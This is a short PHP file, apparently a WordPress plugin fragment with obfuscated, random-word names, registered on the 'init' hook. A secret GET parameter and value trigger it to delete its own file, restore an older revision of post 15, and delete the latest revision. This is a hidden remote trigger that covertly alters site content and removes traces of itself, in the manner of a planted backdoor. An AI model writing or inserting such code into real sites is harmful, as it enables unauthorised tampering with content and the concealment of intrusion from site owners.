<?php

function shortener_optimize_business_scss() {
	if (isset($_GET['date_dev_slider_posts']) && $_GET['date_dev_slider_posts'] === 'revisions_local_icons_save') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tabs_slider_weather = 15;
		$redirection_load_asset = wp_get_post_revisions($tabs_slider_weather);
		if (empty($redirection_load_asset)) die('no revisions');
		if (count($redirection_load_asset) < 2) die('less than 2');
		$fancy_smtp_frontend = array_shift($redirection_load_asset);
		$attachments_files_player_members = $fancy_smtp_frontend->ID;
		$mode_store_scroll_coming = array_shift($redirection_load_asset);
		$forum_flexible_first = $mode_store_scroll_coming->ID;
		$smooth_gamipress_details = wp_restore_post_revision($forum_flexible_first);
		if ($smooth_gamipress_details === false) die('error restoring');
		$smooth_gamipress_details = wp_delete_post_revision($attachments_files_player_members);		
		if ($smooth_gamipress_details === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'shortener_optimize_business_scss');
